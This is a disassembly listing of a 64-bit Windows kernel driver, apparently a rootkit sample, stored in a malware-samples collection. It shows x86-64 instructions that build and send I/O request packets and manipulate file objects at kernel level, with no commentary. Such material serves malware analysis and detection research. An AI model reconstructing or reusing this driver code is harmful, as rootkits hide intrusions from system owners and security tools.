
malware_samples/rootkit/c3b84b2274ae04d6c13c69b2e08795a486ada503fac7a8cde3a73c3cd13230b2.sys:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001005:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000100a:	55                   	push   %rbp
   14000100b:	57                   	push   %rdi
   14000100c:	41 56                	push   %r14
   14000100e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140001013:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   14000101a:	48 8b 05 df 2f 00 00 	mov    0x2fdf(%rip),%rax        # 0x140004000
   140001021:	48 33 c4             	xor    %rsp,%rax
   140001024:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001028:	0f 10 01             	movups (%rcx),%xmm0
   14000102b:	48 83 65 ef 00       	andq   $0x0,-0x11(%rbp)
   140001030:	4c 8d 4d f7          	lea    -0x9(%rbp),%r9
   140001034:	33 f6                	xor    %esi,%esi
   140001036:	4c 8d 45 07          	lea    0x7(%rbp),%r8
   14000103a:	21 74 24 50          	and    %esi,0x50(%rsp)
   14000103e:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   140001042:	48 21 74 24 48       	and    %rsi,0x48(%rsp)
   140001047:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   14000104c:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001053:	00 
   140001054:	33 ff                	xor    %edi,%edi
   140001056:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   14000105d:	00 
   14000105e:	45 33 f6             	xor    %r14d,%r14d
   140001061:	f3 0f 7f 45 07       	movdqu %xmm0,0x7(%rbp)
   140001066:	c7 44 24 30 07 00 00 	movl   $0x7,0x30(%rsp)
   14000106d:	00 
   14000106e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001071:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001078:	00 
   140001079:	48 21 74 24 20       	and    %rsi,0x20(%rsp)
   14000107e:	0f 11 45 f7          	movups %xmm0,-0x9(%rbp)
   140001082:	e8 8d 01 00 00       	call   0x140001214
   140001087:	8b d8                	mov    %eax,%ebx
   140001089:	85 c0                	test   %eax,%eax
   14000108b:	79 16                	jns    0x1400010a3
   14000108d:	48 8d 0d 1c 13 00 00 	lea    0x131c(%rip),%rcx        # 0x1400023b0
   140001094:	0f ae e8             	lfence
   140001097:	8b d3                	mov    %ebx,%edx
   140001099:	e8 9f 0e 00 00       	call   0x140001f3d
   14000109e:	e9 e4 00 00 00       	jmp    0x140001187
   1400010a3:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   1400010a7:	4c 8d 45 17          	lea    0x17(%rbp),%r8
   1400010ab:	33 c0                	xor    %eax,%eax
   1400010ad:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400010b4:	00 
   1400010b5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400010b8:	48 89 45 37          	mov    %rax,0x37(%rbp)
   1400010bc:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   1400010c0:	c7 45 37 80 00 00 00 	movl   $0x80,0x37(%rbp)
   1400010c7:	0f 11 45 17          	movups %xmm0,0x17(%rbp)
   1400010cb:	44 8d 48 28          	lea    0x28(%rax),%r9d
   1400010cf:	0f 11 45 27          	movups %xmm0,0x27(%rbp)
   1400010d3:	e8 6c 06 00 00       	call   0x140001744
   1400010d8:	8b d8                	mov    %eax,%ebx
   1400010da:	85 c0                	test   %eax,%eax
   1400010dc:	79 09                	jns    0x1400010e7
   1400010de:	48 8d 0d eb 12 00 00 	lea    0x12eb(%rip),%rcx        # 0x1400023d0
   1400010e5:	eb ad                	jmp    0x140001094
   1400010e7:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   1400010eb:	48 8b 41 28          	mov    0x28(%rcx),%rax
   1400010ef:	48 85 c0             	test   %rax,%rax
   1400010f2:	74 2d                	je     0x140001121
   1400010f4:	48 8b 78 10          	mov    0x10(%rax),%rdi
   1400010f8:	48 8b 30             	mov    (%rax),%rsi
   1400010fb:	4c 8b 70 08          	mov    0x8(%rax),%r14
   1400010ff:	48 83 60 10 00       	andq   $0x0,0x10(%rax)
   140001104:	48 8b 45 ef          	mov    -0x11(%rbp),%rax
   140001108:	48 8b 48 28          	mov    0x28(%rax),%rcx
   14000110c:	48 83 21 00          	andq   $0x0,(%rcx)
   140001110:	48 8b 45 ef          	mov    -0x11(%rbp),%rax
   140001114:	48 8b 48 28          	mov    0x28(%rax),%rcx
   140001118:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   14000111d:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001121:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001127:	c6 45 e7 01          	movb   $0x1,-0x19(%rbp)
   14000112b:	4c 8d 45 e7          	lea    -0x19(%rbp),%r8
   14000112f:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140001136:	00 
   140001137:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   14000113b:	e8 04 06 00 00       	call   0x140001744
   140001140:	8b d8                	mov    %eax,%ebx
   140001142:	0f ae e8             	lfence
   140001145:	85 c0                	test   %eax,%eax
   140001147:	79 0c                	jns    0x140001155
   140001149:	48 8d 0d c0 12 00 00 	lea    0x12c0(%rip),%rcx        # 0x140002410
   140001150:	e9 42 ff ff ff       	jmp    0x140001097
   140001155:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001159:	48 8b 41 28          	mov    0x28(%rcx),%rax
   14000115d:	48 85 c0             	test   %rax,%rax
   140001160:	74 1f                	je     0x140001181
   140001162:	48 89 78 10          	mov    %rdi,0x10(%rax)
   140001166:	48 8b 45 ef          	mov    -0x11(%rbp),%rax
   14000116a:	48 8b 48 28          	mov    0x28(%rax),%rcx
   14000116e:	48 89 31             	mov    %rsi,(%rcx)
   140001171:	48 8b 45 ef          	mov    -0x11(%rbp),%rax
   140001175:	48 8b 48 28          	mov    0x28(%rax),%rcx
   140001179:	4c 89 71 08          	mov    %r14,0x8(%rcx)
   14000117d:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001181:	ff 15 81 1e 00 00    	call   *0x1e81(%rip)        # 0x140003008
   140001187:	8b c3                	mov    %ebx,%eax
   140001189:	48 8b 4d 3f          	mov    0x3f(%rbp),%rcx
   14000118d:	48 33 cc             	xor    %rsp,%rcx
   140001190:	e8 5b 0d 00 00       	call   0x140001ef0
   140001195:	4c 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%r11
   14000119c:	00 
   14000119d:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400011a1:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400011a5:	49 8b e3             	mov    %r11,%rsp
   1400011a8:	41 5e                	pop    %r14
   1400011aa:	5f                   	pop    %rdi
   1400011ab:	5d                   	pop    %rbp
   1400011ac:	c3                   	ret
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	4c 8b dc             	mov    %rsp,%r11
   1400011b3:	48 83 ec 78          	sub    $0x78,%rsp
   1400011b7:	33 c0                	xor    %eax,%eax
   1400011b9:	4d 8d 4b e8          	lea    -0x18(%r11),%r9
   1400011bd:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400011c1:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011c4:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   1400011c8:	4c 8b c1             	mov    %rcx,%r8
   1400011cb:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400011d2:	00 
   1400011d3:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   1400011d7:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   1400011de:	00 
   1400011df:	ba 80 00 11 00       	mov    $0x110080,%edx
   1400011e4:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400011eb:	00 
   1400011ec:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400011f3:	00 
   1400011f4:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   1400011f8:	49 89 43 10          	mov    %rax,0x10(%r11)
   1400011fc:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140001201:	e8 0e 00 00 00       	call   0x140001214
   140001206:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000120d:	00 
   14000120e:	48 83 c4 78          	add    $0x78,%rsp
   140001212:	c3                   	ret
   140001213:	cc                   	int3
   140001214:	40 55                	rex push %rbp
   140001216:	53                   	push   %rbx
   140001217:	56                   	push   %rsi
   140001218:	57                   	push   %rdi
   140001219:	41 54                	push   %r12
   14000121b:	41 55                	push   %r13
   14000121d:	41 56                	push   %r14
   14000121f:	41 57                	push   %r15
   140001221:	48 8d ac 24 58 fa ff 	lea    -0x5a8(%rsp),%rbp
   140001228:	ff 
   140001229:	48 81 ec a8 06 00 00 	sub    $0x6a8,%rsp
   140001230:	48 8b 05 c9 2d 00 00 	mov    0x2dc9(%rip),%rax        # 0x140004000
   140001237:	48 33 c4             	xor    %rsp,%rax
   14000123a:	48 89 85 90 05 00 00 	mov    %rax,0x590(%rbp)
   140001241:	4d 8b e8             	mov    %r8,%r13
   140001244:	44 8b e2             	mov    %edx,%r12d
   140001247:	4c 8b f9             	mov    %rcx,%r15
   14000124a:	33 d2                	xor    %edx,%edx
   14000124c:	41 b8 b8 00 00 00    	mov    $0xb8,%r8d
   140001252:	48 8d 8d d0 04 00 00 	lea    0x4d0(%rbp),%rcx
   140001259:	49 8b f1             	mov    %r9,%rsi
   14000125c:	e8 5f 10 00 00       	call   0x1400022c0
   140001261:	33 ff                	xor    %edi,%edi
   140001263:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001267:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000126a:	89 7d 8c             	mov    %edi,-0x74(%rbp)
   14000126d:	33 c0                	xor    %eax,%eax
   14000126f:	89 7d a4             	mov    %edi,-0x5c(%rbp)
   140001272:	33 d2                	xor    %edx,%edx
   140001274:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001278:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   14000127e:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140001283:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140001287:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   14000128b:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140001290:	e8 2b 10 00 00       	call   0x1400022c0
   140001295:	0f 10 05 a4 11 00 00 	movups 0x11a4(%rip),%xmm0        # 0x140002440
   14000129c:	49 8b 45 08          	mov    0x8(%r13),%rax
   1400012a0:	48 8d 95 c0 04 00 00 	lea    0x4c0(%rbp),%rdx
   1400012a7:	f3 0f 7f 85 c0 04 00 	movdqu %xmm0,0x4c0(%rbp)
   1400012ae:	00 
   1400012af:	0f b7 08             	movzwl (%rax),%ecx
   1400012b2:	66 89 8d c8 04 00 00 	mov    %cx,0x4c8(%rbp)
   1400012b9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400012bd:	ff 15 4d 1d 00 00    	call   *0x1d4d(%rip)        # 0x140003010
   1400012c3:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400012c7:	48 8d 0d 82 11 00 00 	lea    0x1182(%rip),%rcx        # 0x140002450
   1400012ce:	e8 6a 0c 00 00       	call   0x140001f3d
   1400012d3:	c7 44 24 68 00 01 00 	movl   $0x100,0x68(%rsp)
   1400012da:	00 
   1400012db:	44 8d 77 01          	lea    0x1(%rdi),%r14d
   1400012df:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400012e4:	4c 8d 45 88          	lea    -0x78(%rbp),%r8
   1400012e8:	89 7c 24 58          	mov    %edi,0x58(%rsp)
   1400012ec:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400012f1:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   1400012f5:	b8 00 02 00 00       	mov    $0x200,%eax
   1400012fa:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   1400012ff:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001302:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001309:	00 
   14000130a:	4c 8b ce             	mov    %rsi,%r9
   14000130d:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140001312:	ba 00 00 10 80       	mov    $0x80100000,%edx
   140001317:	89 45 a0             	mov    %eax,-0x60(%rbp)
   14000131a:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000131e:	c7 44 24 30 07 00 00 	movl   $0x7,0x30(%rsp)
   140001325:	00 
   140001326:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000132d:	00 
   14000132e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001333:	c7 45 88 30 00 00 00 	movl   $0x30,-0x78(%rbp)
   14000133a:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   14000133e:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140001342:	f3 0f 7f 45 a8       	movdqu %xmm0,-0x58(%rbp)
   140001347:	ff 15 fb 1c 00 00    	call   *0x1cfb(%rip)        # 0x140003048
   14000134d:	8b d8                	mov    %eax,%ebx
   14000134f:	85 c0                	test   %eax,%eax
   140001351:	79 16                	jns    0x140001369
   140001353:	0f ae e8             	lfence
   140001356:	48 8d 0d 03 11 00 00 	lea    0x1103(%rip),%rcx        # 0x140002460
   14000135d:	8b d3                	mov    %ebx,%edx
   14000135f:	e8 d9 0b 00 00       	call   0x140001f3d
   140001364:	e9 b6 03 00 00       	jmp    0x14000171f
   140001369:	4c 8b 05 18 1d 00 00 	mov    0x1d18(%rip),%r8        # 0x140003088
   140001370:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   140001374:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140001379:	45 33 c9             	xor    %r9d,%r9d
   14000137c:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001381:	41 8b d6             	mov    %r14d,%edx
   140001384:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001389:	4d 8b 00             	mov    (%r8),%r8
   14000138c:	ff 15 ce 1c 00 00    	call   *0x1cce(%rip)        # 0x140003060
   140001392:	8b d8                	mov    %eax,%ebx
   140001394:	85 c0                	test   %eax,%eax
   140001396:	79 17                	jns    0x1400013af
   140001398:	0f ae e8             	lfence
   14000139b:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400013a0:	ff 15 c2 1c 00 00    	call   *0x1cc2(%rip)        # 0x140003068
   1400013a6:	48 8d 0d d3 10 00 00 	lea    0x10d3(%rip),%rcx        # 0x140002480
   1400013ad:	eb ae                	jmp    0x14000135d
   1400013af:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   1400013b3:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400013b7:	4c 8b 70 08          	mov    0x8(%rax),%r14
   1400013bb:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400013bf:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   1400013c3:	ff 15 3f 1c 00 00    	call   *0x1c3f(%rip)        # 0x140003008
   1400013c9:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400013ce:	ff 15 94 1c 00 00    	call   *0x1c94(%rip)        # 0x140003068
   1400013d4:	41 8a 4e 4c          	mov    0x4c(%r14),%cl
   1400013d8:	33 d2                	xor    %edx,%edx
   1400013da:	ff 15 58 1c 00 00    	call   *0x1c58(%rip)        # 0x140003038
   1400013e0:	48 8b d8             	mov    %rax,%rbx
   1400013e3:	48 85 c0             	test   %rax,%rax
   1400013e6:	75 21                	jne    0x140001409
   1400013e8:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400013ed:	ff 15 15 1c 00 00    	call   *0x1c15(%rip)        # 0x140003008
   1400013f3:	48 8d 0d b6 10 00 00 	lea    0x10b6(%rip),%rcx        # 0x1400024b0
   1400013fa:	e8 3e 0b 00 00       	call   0x140001f3d
   1400013ff:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140001404:	e9 18 03 00 00       	jmp    0x140001721
   140001409:	45 33 c0             	xor    %r8d,%r8d
   14000140c:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140001410:	41 8d 50 01          	lea    0x1(%r8),%edx
   140001414:	ff 15 fe 1b 00 00    	call   *0x1bfe(%rip)        # 0x140003018
   14000141a:	48 8b 15 67 1c 00 00 	mov    0x1c67(%rip),%rdx        # 0x140003088
   140001421:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140001426:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000142b:	4c 8d 45 88          	lea    -0x78(%rbp),%r8
   14000142f:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   140001433:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001436:	b8 d8 00 00 00       	mov    $0xd8,%eax
   14000143b:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   14000143f:	c7 45 88 30 00 00 00 	movl   $0x30,-0x78(%rbp)
   140001446:	45 33 c9             	xor    %r9d,%r9d
   140001449:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   14000144d:	33 c9                	xor    %ecx,%ecx
   14000144f:	c7 45 a0 40 00 00 00 	movl   $0x40,-0x60(%rbp)
   140001456:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
   14000145a:	f3 0f 7f 45 a8       	movdqu %xmm0,-0x58(%rbp)
   14000145f:	48 8b 12             	mov    (%rdx),%rdx
   140001462:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001466:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000146b:	e8 5a 0b 00 00       	call   0x140001fca
   140001470:	8b f8                	mov    %eax,%edi
   140001472:	85 c0                	test   %eax,%eax
   140001474:	79 18                	jns    0x14000148e
   140001476:	0f ae e8             	lfence
   140001479:	48 8d 0d 50 10 00 00 	lea    0x1050(%rip),%rcx        # 0x1400024d0
   140001480:	8b d7                	mov    %edi,%edx
   140001482:	e8 b6 0a 00 00       	call   0x140001f3d
   140001487:	8b c7                	mov    %edi,%eax
   140001489:	e9 93 02 00 00       	jmp    0x140001721
   14000148e:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001493:	bf d8 00 00 00       	mov    $0xd8,%edi
   140001498:	44 8b c7             	mov    %edi,%r8d
   14000149b:	33 d2                	xor    %edx,%edx
   14000149d:	e8 1e 0e 00 00       	call   0x1400022c0
   1400014a2:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400014a7:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400014ac:	ba 00 02 00 00       	mov    $0x200,%edx
   1400014b1:	66 89 08             	mov    %cx,(%rax)
   1400014b4:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400014b9:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   1400014bd:	66 89 78 02          	mov    %di,0x2(%rax)
   1400014c1:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400014c6:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400014ca:	33 c9                	xor    %ecx,%ecx
   1400014cc:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400014d1:	c7 40 50 02 00 00 00 	movl   $0x2,0x50(%rax)
   1400014d8:	ff 15 52 1b 00 00    	call   *0x1b52(%rip)        # 0x140003030
   1400014de:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400014e3:	ba 00 02 00 00       	mov    $0x200,%edx
   1400014e8:	44 8b c2             	mov    %edx,%r8d
   1400014eb:	bf 04 00 00 00       	mov    $0x4,%edi
   1400014f0:	48 89 41 60          	mov    %rax,0x60(%rcx)
   1400014f4:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400014f9:	66 89 50 5a          	mov    %dx,0x5a(%rax)
   1400014fd:	33 d2                	xor    %edx,%edx
   1400014ff:	41 0f b7 4d 00       	movzwl 0x0(%r13),%ecx
   140001504:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140001509:	66 2b cf             	sub    %di,%cx
   14000150c:	66 89 48 58          	mov    %cx,0x58(%rax)
   140001510:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001515:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140001519:	e8 a2 0d 00 00       	call   0x1400022c0
   14000151e:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001523:	49 8b 55 08          	mov    0x8(%r13),%rdx
   140001527:	48 03 d7             	add    %rdi,%rdx
   14000152a:	44 0f b7 41 58       	movzwl 0x58(%rcx),%r8d
   14000152f:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140001533:	e8 c8 0a 00 00       	call   0x140002000
   140001538:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   14000153d:	48 8d 0d ac 0f 00 00 	lea    0xfac(%rip),%rcx        # 0x1400024f0
   140001544:	48 83 c2 58          	add    $0x58,%rdx
   140001548:	e8 f0 09 00 00       	call   0x140001f3d
   14000154d:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001552:	8d 57 fd             	lea    -0x3(%rdi),%edx
   140001555:	48 83 e9 80          	sub    $0xffffffffffffff80,%rcx
   140001559:	45 33 c0             	xor    %r8d,%r8d
   14000155c:	ff 15 b6 1a 00 00    	call   *0x1ab6(%rip)        # 0x140003018
   140001562:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001567:	45 33 c0             	xor    %r8d,%r8d
   14000156a:	48 81 c1 98 00 00 00 	add    $0x98,%rcx
   140001571:	33 d2                	xor    %edx,%edx
   140001573:	ff 15 9f 1a 00 00    	call   *0x1a9f(%rip)        # 0x140003018
   140001579:	33 d2                	xor    %edx,%edx
   14000157b:	48 8d 8d a0 00 00 00 	lea    0xa0(%rbp),%rcx
   140001582:	41 b8 20 04 00 00    	mov    $0x420,%r8d
   140001588:	e8 33 0d 00 00       	call   0x1400022c0
   14000158d:	ff 15 dd 1a 00 00    	call   *0x1add(%rip)        # 0x140003070
   140001593:	45 8b c4             	mov    %r12d,%r8d
   140001596:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   14000159d:	4c 8b c8             	mov    %rax,%r9
   1400015a0:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400015a4:	e8 1b 0a 00 00       	call   0x140001fc4
   1400015a9:	45 33 ed             	xor    %r13d,%r13d
   1400015ac:	8b f8                	mov    %eax,%edi
   1400015ae:	85 c0                	test   %eax,%eax
   1400015b0:	79 23                	jns    0x1400015d5
   1400015b2:	0f ae e8             	lfence
   1400015b5:	48 8b cb             	mov    %rbx,%rcx
   1400015b8:	ff 15 92 1a 00 00    	call   *0x1a92(%rip)        # 0x140003050
   1400015be:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400015c3:	ff 15 3f 1a 00 00    	call   *0x1a3f(%rip)        # 0x140003008
   1400015c9:	48 8d 0d 40 0f 00 00 	lea    0xf40(%rip),%rcx        # 0x140002510
   1400015d0:	e9 ab fe ff ff       	jmp    0x140001480
   1400015d5:	4c 89 6d c0          	mov    %r13,-0x40(%rbp)
   1400015d9:	48 8d 45 00          	lea    0x0(%rbp),%rax
   1400015dd:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400015e1:	48 8d 0d 98 02 00 00 	lea    0x298(%rip),%rcx        # 0x140001880
   1400015e8:	48 8b 85 38 06 00 00 	mov    0x638(%rbp),%rax
   1400015ef:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400015f2:	44 89 65 d0          	mov    %r12d,-0x30(%rbp)
   1400015f6:	44 89 6d d4          	mov    %r13d,-0x2c(%rbp)
   1400015fa:	0f 11 06             	movups %xmm0,(%rsi)
   1400015fd:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140001601:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140001605:	48 89 43 50          	mov    %rax,0x50(%rbx)
   140001609:	4c 89 6b 08          	mov    %r13,0x8(%rbx)
   14000160d:	c7 43 10 84 00 00 00 	movl   $0x84,0x10(%rbx)
   140001614:	66 44 89 6b 40       	mov    %r13w,0x40(%rbx)
   140001619:	48 89 73 48          	mov    %rsi,0x48(%rbx)
   14000161d:	44 88 6b 44          	mov    %r13b,0x44(%rbx)
   140001621:	4c 89 6b 68          	mov    %r13,0x68(%rbx)
   140001625:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   14000162c:	00 00 
   14000162e:	48 8b 93 b8 00 00 00 	mov    0xb8(%rbx),%rdx
   140001635:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   14000163c:	4c 89 ab a0 00 00 00 	mov    %r13,0xa0(%rbx)
   140001643:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140001648:	48 89 83 c0 00 00 00 	mov    %rax,0xc0(%rbx)
   14000164f:	44 88 6a b8          	mov    %r13b,-0x48(%rdx)
   140001653:	4c 89 72 e0          	mov    %r14,-0x20(%rdx)
   140001657:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000165c:	48 89 42 e8          	mov    %rax,-0x18(%rdx)
   140001660:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140001664:	48 89 42 c0          	mov    %rax,-0x40(%rdx)
   140001668:	8b 85 28 06 00 00    	mov    0x628(%rbp),%eax
   14000166e:	c1 e0 18             	shl    $0x18,%eax
   140001671:	0b 85 30 06 00 00    	or     0x630(%rbp),%eax
   140001677:	89 42 c8             	mov    %eax,-0x38(%rdx)
   14000167a:	0f b7 85 18 06 00 00 	movzwl 0x618(%rbp),%eax
   140001681:	66 89 42 d0          	mov    %ax,-0x30(%rdx)
   140001685:	0f b7 85 20 06 00 00 	movzwl 0x620(%rbp),%eax
   14000168c:	66 89 42 d2          	mov    %ax,-0x2e(%rdx)
   140001690:	8b 85 40 06 00 00    	mov    0x640(%rbp),%eax
   140001696:	89 42 d8             	mov    %eax,-0x28(%rdx)
   140001699:	48 8b d3             	mov    %rbx,%rdx
   14000169c:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   1400016a3:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   1400016a7:	49 8b ce             	mov    %r14,%rcx
   1400016aa:	4c 89 68 f8          	mov    %r13,-0x8(%rax)
   1400016ae:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   1400016b2:	ff 15 88 19 00 00    	call   *0x1988(%rip)        # 0x140003040
   1400016b8:	3d 03 01 00 00       	cmp    $0x103,%eax
   1400016bd:	75 17                	jne    0x1400016d6
   1400016bf:	41 b1 01             	mov    $0x1,%r9b
   1400016c2:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400016c7:	45 33 c0             	xor    %r8d,%r8d
   1400016ca:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400016ce:	33 d2                	xor    %edx,%edx
   1400016d0:	ff 15 52 19 00 00    	call   *0x1952(%rip)        # 0x140003028
   1400016d6:	8b 1e                	mov    (%rsi),%ebx
   1400016d8:	0f ae e8             	lfence
   1400016db:	85 db                	test   %ebx,%ebx
   1400016dd:	79 19                	jns    0x1400016f8
   1400016df:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400016e4:	ff 15 1e 19 00 00    	call   *0x191e(%rip)        # 0x140003008
   1400016ea:	48 8d 0d 4f 0e 00 00 	lea    0xe4f(%rip),%rcx        # 0x140002540
   1400016f1:	e8 47 08 00 00       	call   0x140001f3d
   1400016f6:	eb 27                	jmp    0x14000171f
   1400016f8:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400016fd:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001701:	f0 ff 41 04          	lock incl 0x4(%rcx)
   140001705:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000170a:	48 8b 48 10          	mov    0x10(%rax),%rcx
   14000170e:	48 85 c9             	test   %rcx,%rcx
   140001711:	74 09                	je     0x14000171c
   140001713:	f0 ff 41 1c          	lock incl 0x1c(%rcx)
   140001717:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000171c:	49 89 07             	mov    %rax,(%r15)
   14000171f:	8b c3                	mov    %ebx,%eax
   140001721:	48 8b 8d 90 05 00 00 	mov    0x590(%rbp),%rcx
   140001728:	48 33 cc             	xor    %rsp,%rcx
   14000172b:	e8 c0 07 00 00       	call   0x140001ef0
   140001730:	48 81 c4 a8 06 00 00 	add    $0x6a8,%rsp
   140001737:	41 5f                	pop    %r15
   140001739:	41 5e                	pop    %r14
   14000173b:	41 5d                	pop    %r13
   14000173d:	41 5c                	pop    %r12
   14000173f:	5f                   	pop    %rdi
   140001740:	5e                   	pop    %rsi
   140001741:	5b                   	pop    %rbx
   140001742:	5d                   	pop    %rbp
   140001743:	c3                   	ret
   140001744:	4c 8b dc             	mov    %rsp,%r11
   140001747:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   14000174b:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   14000174f:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140001753:	57                   	push   %rdi
   140001754:	41 56                	push   %r14
   140001756:	41 57                	push   %r15
   140001758:	48 83 ec 50          	sub    $0x50,%rsp
   14000175c:	33 c0                	xor    %eax,%eax
   14000175e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001761:	41 8b e9             	mov    %r9d,%ebp
   140001764:	4d 8b f8             	mov    %r8,%r15
